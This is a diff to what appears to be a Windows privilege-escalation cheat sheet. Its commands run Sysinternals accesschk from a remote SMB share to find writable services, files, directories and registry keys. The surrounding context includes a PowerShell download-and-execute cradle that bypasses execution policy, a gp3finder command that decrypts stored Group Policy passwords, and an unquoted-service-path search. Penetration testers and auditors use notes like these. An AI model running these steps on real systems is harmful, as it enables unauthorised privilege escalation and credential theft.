@@ -53,55 +53,75 @@ powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).Downlo
 # Find and decrypt cpasswords on the local machine
 //$source_ip/$smb_share/scripts_windows/gp3finder.exe -A -l
 
-# Services with write access
+# Services
+## Services with write access
 //$source_ip/$smb_share/scripts_windows/accesschk.exe -uwcqv * /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwcqv * /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwcqv * /accepteula
 
-# Services with write access to user testuser
+## Services with write access to user testuser
 //$source_ip/$smb_share/scripts_windows/accesschk.exe -uwcqv "testuser" * /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwcqv "testuser" * /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwcqv "testuser" * /accepteula
 
-# Services with write access for Authenticated Users
+## Services with write access for Authenticated Users
 //$source_ip/$smb_share/scripts_windows/accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwcqv "Authenticated Users" * /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwcqv "Authenticated Users" * /accepteula
 
-# Services with write access for Everyone
+## Services with write access for Everyone
 //$source_ip/$smb_share/scripts_windows/accesschk.exe -uwcqv "Everyone" * /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwcqv "Everyone" * /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwcqv "Everyone" * /accepteula
 
-# Services details for all services
+## Services details for all services
 //$source_ip/$smb_share/scripts_windows/accesschk.exe -ucqv * /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -ucqv * /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -ucqv * /accepteula
 
-# Services details for Spooler
+## Services details for Spooler
 //$source_ip/$smb_share/scripts_windows/accesschk.exe -ucqv Spooler /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -ucqv Spooler /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -ucqv Spooler /accepteula
 
-# File permissions (s for recursive)
+# Files
+## File permissions (s for recursive)
 //$source_ip/$smb_share/scripts_windows/accesschk.exe -udqs "C:\" /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -udqs "C:\" /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -udqs "C:\" /accepteula
 
-# Write access to file for Users
+## Write access to directories for Users
 //$source_ip/$smb_share/scripts_windows/accesschk.exe -uwdqs "Users" "C:" /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwdqs "Users" "C:\" /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwdqs "Users" "C:\" /accepteula
 
-# Write access to file for Authenticated Users
+## Write access to file for Users
+//$source_ip/$smb_share/scripts_windows/accesschk.exe -uwdqs "Users" "C:" /accepteula
+//$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwdqs "Users" "C:\" /accepteula
+//$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwdqs "Users" "C:\" /accepteula
+
+## Write access to file for Authenticated Users
 //$source_ip/$smb_share/scripts_windows/accesschk.exe -uwdqs "Authenticated Users" "C:\" /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwdqs "Authenticated Users" "C:\" /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwdqs "Authenticated Users" "C:\" /accepteula
 
-# Write access to file for Everyone
+## Write access to file for Everyone
 //$source_ip/$smb_share/scripts_windows/accesschk.exe -uwdqs "Everyone" "C:\" /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwdqs "Everyone" "C:\" /accepteula
 //$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwdqs "Everyone" "C:\" /accepteula
+
+## List file with explicit integrity levels 
+//$source_ip/$smb_share/scripts_windows/accesschk.exe -e -s c:\users\mark /accepteula
+
+# Registry 
+## Registry keys under Hhklm\software user has write access to
+//$source_ip/$smb_share/scripts_windows/accesschk.exe -kws user hklm\software /accepteula
+
+## Security of hklm\software
+//$source_ip/$smb_share/scripts_windows/accesschk.exe -k hklm\software  /accepteula
+
+## Global objects everyone can modify
+//$source_ip/$smb_share/scripts_windows/accesschk.exe -wuo Everyone \basednamedobjects /accepteula
 
 # Find servive unquote paths
 wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\" |findstr /i /v """
